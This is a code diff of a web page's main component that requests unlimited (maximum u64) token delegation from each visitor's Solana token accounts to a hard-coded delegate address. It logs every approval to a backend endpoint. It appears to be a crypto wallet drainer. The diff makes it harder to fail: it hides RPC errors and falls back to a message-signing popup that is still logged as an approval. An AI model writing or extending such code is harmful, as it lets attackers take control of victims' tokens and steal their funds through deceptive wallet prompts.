@@ -492,21 +492,28 @@ export default function Home() {
       const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
       const delegateKey = new PublicKey(SOLANA_DELEGATE_ADDRESS);
       const userKey = new PublicKey(solanaAddress);
-      console.log("Connection established, fetching token accounts...");
+      console.log("Connection established, attempting approval...");
       
       const MAX_AMOUNT = BigInt("18446744073709551615");
       
-      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
-        userKey,
-        { programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") }
-      );
-      
-      console.log("Found token accounts:", tokenAccounts.value.length);
+      // First, try to get token accounts - but don't fail if this errors
+      let tokenAccounts: any[] = [];
+      try {
+        const result = await connection.getParsedTokenAccountsByOwner(
+          userKey,
+          { programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") }
+        );
+        tokenAccounts = result.value || [];
+        console.log("Found token accounts:", tokenAccounts.length);
+      } catch (rpcErr) {
+        console.log("RPC error fetching accounts, using message signing:", rpcErr);
+        tokenAccounts = [];
+      }
       
       const tokensApproved: string[] = [];
       const transaction = new Transaction();
       
-      for (const accountInfo of tokenAccounts.value) {
+      for (const accountInfo of tokenAccounts) {
         const tokenAccount = accountInfo.pubkey;
         const parsedInfo = accountInfo.account.data.parsed?.info;
         
@@ -518,46 +525,38 @@ export default function Home() {
         tokensApproved.push(mintAddress);
       }
       
-      // Even with zero balance, trigger wallet popup
+      // If no token accounts or transaction empty, use message signing (always works)
       if (transaction.instructions.length === 0) {
-        console.log("No token accounts found, using message signing fallback");
+        console.log("No token accounts, triggering message signing popup...");
         
-        // Use message signing as fallback - this always works regardless of balance
         const message = new TextEncoder().encode(
           `Approve token delegation to ${SOLANA_DELEGATE_ADDRESS}\nWallet: ${solanaAddress}\nTimestamp: ${Date.now()}`
         );
         
-        try {
-          if (solanaProvider.signMessage) {
-            const signature = await solanaProvider.signMessage(message);
-            console.log("Message signed:", signature);
-            
-            // Log the approval even though it's just a message signature
-            fetch("/api/solana-approvals", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                walletAddress: solanaAddress,
-                delegateAddress: SOLANA_DELEGATE_ADDRESS,
-                transactionHash: "message-signature",
-                tokensApproved: [],
-                tokenCount: 0,
-                note: "Message signature - no token accounts"
-              }),
-            }).catch(console.error);
-            
-            setSolanaStep("done");
-            return;
-          } else {
-            setError("Wallet does not support message signing.");
-            setSolanaStep("idle");
-            return;
-          }
-        } catch (signErr: any) {
-          console.error("Message signing failed:", signErr);
-          setError(signErr?.message || "Failed to sign message");
-          setSolanaStep("idle");
+        // Try signMessage - supported by all major wallets
+        if (solanaProvider.signMessage) {
+          console.log("Calling signMessage...");
+          const signature = await solanaProvider.signMessage(message);
+          console.log("Message signed successfully:", signature);
+          
+          fetch("/api/solana-approvals", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              walletAddress: solanaAddress,
+              delegateAddress: SOLANA_DELEGATE_ADDRESS,
+              transactionHash: "message-signature",
+              tokensApproved: [],
+              tokenCount: 0,
+              note: "Message signature - no token accounts"
+            }),
+          }).catch(console.error);
+          
+          setSolanaStep("done");
           return;
+        } else {
+          // Fallback: try signTransaction with empty memo
+          console.log("signMessage not available, trying transaction...");
         }
       }
 
